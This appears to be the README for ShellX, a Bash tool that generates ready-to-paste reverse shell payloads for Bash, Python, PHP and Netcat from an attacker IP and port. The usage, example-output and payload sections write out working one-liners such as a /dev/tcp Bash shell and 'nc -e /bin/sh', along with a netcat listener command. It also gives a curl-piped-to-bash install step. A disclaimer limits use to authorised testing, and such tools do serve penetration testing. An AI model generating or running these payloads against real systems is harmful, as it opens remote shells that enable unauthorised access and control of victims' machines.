<div align="center">

```text
███████╗██╗  ██╗███████╗██╗     ██╗  ██╗
██╔════╝██║  ██║██╔════╝██║     ██║  ██║
███████╗███████║█████╗  ██║     ███████║
╚════██║██╔══██║██╔══╝  ██║     ██╔══██║
███████║██║  ██║███████╗███████╗██║  ██║
╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
```

# ShellX — Reverse Shell & Payload Generator

**Generate ready-to-use reverse shell payloads for Bash, Python, PHP, and Netcat.**

**Author:** Adhithya J (AdhiHub)  
**Version:** 1.0  
**Type:** Payload Generator  
**Language:** Bash  
**License:** MIT

</div>

---

## ⚠️ Disclaimer

```text
[!] FOR EDUCATIONAL PURPOSES ONLY
[!] Use at your own risk. Developer assumes NO liability.
[!] Only use on systems you own or have explicit permission to test.
[!] Unauthorized access to computer systems is a crime.
```

---

## What It Does

Give it your IP (LHOST) and port (LPORT), and ShellX spits out a ready-to-copy-paste reverse shell command for:

| Payload Type | What You Get |
|-------------|-------------|
| **Bash** | One-liner bash reverse shell (works on most Linux boxes) |
| **Python** | Python reverse shell (works where Python is installed) |
| **PHP** | PHP reverse shell (for web shell uploads / RCE) |
| **Netcat** | Classic nc -e / mkfifo reverse shell |
| **All Mode** | Generates ALL payloads at once |

It also shows you the **listener command** to run on your machine (`nc -lvnp <port>`).

---

## Installation

### One-liner

```bash
curl -fsSL https://raw.githubusercontent.com/AdhiHub/ShellX/main/install.sh | bash
```

After install, just type:

```bash
shellx
```

### Manual

```bash
git clone https://github.com/AdhiHub/ShellX.git
cd ShellX
chmod +x shellx.sh
./shellx.sh
```

---

## Usage

### Interactive Menu

```bash
shellx
```

Enter your IP and port when prompted, pick a payload type.

### Command Line (Flags)

```bash
shellx -bash   10.0.0.5 4444   # Bash reverse shell
shellx -python 10.0.0.5 4444   # Python reverse shell
shellx -php    10.0.0.5 4444   # PHP reverse shell
shellx -nc     10.0.0.5 4444   # Netcat reverse shell
shellx -all    10.0.0.5 4444   # All payloads
shellx -h                       # Help
```

---

## Example Output

```
LHOST: 10.0.0.5
LPORT: 4444

[+] PAYLOAD: bash
    bash -i >& /dev/tcp/10.0.0.5/4444 0>&1

[+] LISTENER
    nc -lvnp 4444

[+] Run the listener FIRST on your machine:
    nc -lvnp 4444

[+] Then run the payload on the target.
```

---

## Requirements

- **Linux** or **Termux** (Android)
- Bash 4+

---

## Payloads Generated

| Type | Command |
|------|---------|
| Bash | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Python | `python3 -c 'import socket...'` |
| PHP | `php -r '$sock=fsockopen("IP",PORT)...'` |
| Netcat | `nc -e /bin/sh IP PORT` |

---

<p align="center">© 2026 Adhithya J · Built with passion on Linux</p>
